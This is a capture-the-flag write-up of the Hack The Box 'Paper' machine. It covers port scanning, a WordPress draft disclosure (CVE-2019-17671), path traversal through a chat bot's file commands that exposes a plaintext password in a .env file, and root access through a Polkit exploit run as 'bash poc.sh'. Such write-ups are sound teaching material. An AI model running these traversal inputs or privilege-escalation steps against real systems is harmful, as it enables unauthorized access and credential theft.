> Author: **[secnigma][author-profile]**

## Discovery

### Port scanning

```shell
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
|_SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
```

### Directories

```shell
/.html                (Status: 403) [Size: 199]
/.htm                 (Status: 403) [Size: 199]
/.                    (Status: 403) [Size: 199691]
/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]
/.htaccess            (Status: 403) [Size: 199]                                  
/.htc                 (Status: 403) [Size: 199]                                  
/.html_var_DE         (Status: 403) [Size: 199]                                  
/.htpasswd            (Status: 403) [Size: 199]                                  
/.html.               (Status: 403) [Size: 199]                                  
/.html.html           (Status: 403) [Size: 199]                                  
/.htpasswds           (Status: 403) [Size: 199]                                  
/.htm.                (Status: 403) [Size: 199]                                  
/.htmll               (Status: 403) [Size: 199]                                  
/.html.old            (Status: 403) [Size: 199]                                  
/.ht                  (Status: 403) [Size: 199]                                  
/.html.bak            (Status: 403) [Size: 199]                                  
/.htm.htm             (Status: 403) [Size: 199]                                  
/.html1               (Status: 403) [Size: 199]                                  
/.hta                 (Status: 403) [Size: 199]                                  
/.htgroup             (Status: 403) [Size: 199]                                  
/.html.printable      (Status: 403) [Size: 199]                                  
/.html.LCK            (Status: 403) [Size: 199]                                  
/.htm.LCK             (Status: 403) [Size: 199]                                  
/.html.php            (Status: 403) [Size: 199]                                  
/.htaccess.bak        (Status: 403) [Size: 199]                                  
/.htx                 (Status: 403) [Size: 199]                                  
/.htmls               (Status: 403) [Size: 199]                                  
/.htlm                (Status: 403) [Size: 199]                                  
/.html-               (Status: 403) [Size: 199]                                  
/.htm2                (Status: 403) [Size: 199]                                  
/.htuser              (Status: 403) [Size: 199]
````

### Web browsing

As seen in the previous section, the server is running Apache On CentOS:

![][frontpage]

And in Burpsuite:

```
HTTP/1.1 404 Not Found
Date: Thu, 19 May 2022 09:43:26 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Content-Length: 196
Connection: close
Content-Type: text/html; charset=iso-8859-1
```

After adding `office.paper` to the `/etc/hosts`, this comment stands out:

![][comment]

It is tempting to enumerate the blog posts URLs, but let's get more
information on Wordpress first.

## Viewing the "hidden" drafts

The domain `office.htb` appears in the feed too:

```
http://office.htb/?p=29</guid
http://office.htb/?p=31</guid
http://office.htb/?p=38</guid
http://office.htb/wp-content/uploads/2021/06/handshake-michael-1.jpg
http://office.paper/index.php/2021/06/19/feeling-alone/#comments</comments
http://office.paper/index.php/2021/06/19/feeling-alone/feed/</wfw:commentRss
http://office.paper/index.php/2021/06/19/feeling-alone/</link
http://office.paper/index.php/2021/06/19/hello-scranton/#comments</comments
http://office.paper/index.php/2021/06/19/hello-scranton/feed/</wfw:commentRss
http://office.paper/index.php/2021/06/19/hello-scranton/</link
http://office.paper/index.php/2021/06/19/secret-of-my-success/feed/</wfw:commentRss
http://office.paper/index.php/2021/06/19/secret-of-my-success/</link
http://office.paper/index.php/2021/06/19/secret-of-my-success/#respond</comments
http://office.paper/index.php/feed/
http://office.paper</link
http://office.paper/wp-content/uploads/2021/06/Dunder_Mifflin_Inc-150x150.png</url
http://office.paper/wp-content/uploads/2021/06/handshake-michael-1-300x261.jpg
http://office.paper/wp-content/uploads/2021/06/handshake-michael-1.jpg
http://purl.org/dc/elements/1.1/
http://purl.org/rss/1.0/modules/content/
http://purl.org/rss/1.0/modules/slash/
http://purl.org/rss/1.0/modules/syndication/
https://wordpress.org/?v=5.2.3</generator
http://wellformedweb.org/CommentAPI/
http://www.w3.org/2005/Atom
```

Wordpress version is `5.2.3`, which dates back to 2019:

![][wordpress-version]

Looking at [CVE Details][cve-list], close to 40 vulnerabilities could apply.

The drafts can be seen thanks to [CVE 2019-17671][cve-2019-17671]:

![][draft]

Which leads to the chat server:

![][chat-server]

## The chat server

A lot of information can be gathered from the API calls, but the best is in
the chat itself:

![][recyclops-commands]

The bot implements LFI via the commands `recyclops list ..`:

```
drwx------ 11 dwight dwight 281 Feb 6 07:46 .
drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
-r-------- 1 dwight dwight 33 May 19 04:40 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```

And `recyclops file ../hubot/.env`:

```
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

The password works as SSH credentials!..

## PE

[LinPEAS][linpeas] reveals that the box is vulnerable to CVE 2021-3560,
aka Polkit PE. There's a [POC][cve-2021-3560] made by the author of the box.

It needed 3 runs to work for me:

```shell
bash poc.sh -u=apehex -p=heyhey
su apehex
sudo bash
```

[author-profile]: https://app.hackthebox.com/users/92926
[recyclops-commands]: images/recyclops-commands.png
[comment]: images/comment.png
[chat-server]: images/chat-server.png
[cve-2019-17671]: https://www.cvedetails.com/cve/CVE-2019-17671/
[cve-2021-3560]: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
[cve-list]: https://www.cvedetails.com/product/4096/Wordpress-Wordpress.html?vendor_id=2337
[draft]: images/draft.png
[frontpage]: images/frontpage.png
[wordpress-version]: images/wordpress-version.png
